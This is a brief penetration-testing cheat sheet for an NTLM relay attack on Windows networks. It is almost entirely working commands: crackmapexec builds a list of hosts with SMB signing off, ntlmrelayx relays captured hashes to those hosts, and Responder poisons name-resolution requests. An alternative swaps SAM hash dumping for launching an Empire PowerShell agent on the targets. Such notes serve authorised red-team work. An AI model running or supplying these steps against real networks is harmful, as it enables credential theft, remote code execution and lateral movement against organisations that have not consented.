=== NTLM Relay

This attack answers any request for name lookup with itself, then reuses hashes received by those requests in new requests to other systems.

1. Generate a list of targets with SMB Signing disabled.

  cme smb <CIDR> --gen-relay-list targets.txt

2. Start `ntlmrelayx` to catch SMB and HTTP requests and reuse their hashes against the targets.

  ntlmrelayx.py -tf targets.txt -smb2support

3. Start responder on the LAN interface to attract requests.

  python Responder.py -I <interface> -r -d -w -P

==== Alternatives

  ntlmrelayx.py -tf targets.txt -c <insert your Empire Powershell launcher here>

Run empire launcher instead of the default process of dumping account hashes from the SAM database.
